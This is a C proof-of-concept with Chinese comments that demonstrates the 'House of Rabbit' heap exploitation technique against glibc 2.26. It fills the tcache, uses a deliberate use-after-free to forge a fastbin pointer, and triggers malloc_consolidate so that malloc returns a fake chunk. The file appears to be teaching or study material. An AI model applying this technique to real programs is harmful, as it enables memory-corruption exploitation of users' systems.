/*
 * House of Rabbit：glibc 2.26 专用，x86-64。
 *
 * 2.26 首次引入 tcache；先释放 7 个 0x20 chunk 填满 tcache，真正 victim
 * 才会进入 fastbin。之后仍利用 2.26 malloc_consolidate 缺少跨尺寸检查。
 */
#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

static uint64_t fake_area[0x90] __attribute__((aligned(16)));

int main(void) {
    setbuf(stdout, NULL);

    void *fill[7];
    for (int i = 0; i < 7; ++i)
        fill[i] = malloc(0x18);
    uint64_t *victim = malloc(0x18);
    void *guard = malloc(0x18);
    (void)guard;

    for (int i = 0; i < 7; ++i)
        free(fill[i]);                      /* 2.26 默认 tcache_count=7 */

    fake_area[1] = 0x421;
    fake_area[0x420 / 8 + 1] = 0x21;
    fake_area[0x440 / 8 + 1] = 0x1;

    free(victim);                           /* tcache 已满，所以进入 fastbin */
    victim[0] = (uint64_t)fake_area;        /* UAF：伪造明文 fastbin fd */

    void *trigger = malloc(0x1000);         /* 触发 malloc_consolidate */
    assert(trigger != NULL);

    void *result = malloc(0x410);

    assert(result == (void *)(fake_area + 2));
    puts("[+] Rabbit 2.26：伪块命中");
    return 0;
}
